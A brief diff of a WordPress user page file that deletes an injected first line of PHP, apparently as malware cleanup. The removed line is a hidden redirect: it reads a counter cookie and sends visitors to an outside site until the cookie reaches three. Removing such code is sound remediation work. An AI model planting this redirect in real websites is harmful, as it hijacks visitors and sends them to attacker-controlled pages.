@@ -1,4 +1,3 @@
-<?php if((int)$_COOKIE["alfa_fakepage_counter19869"]<3){@header("Location: http://nfbstores.com/?:2083");exit;}?>
 <?php
 /**
  * WordPress User Page
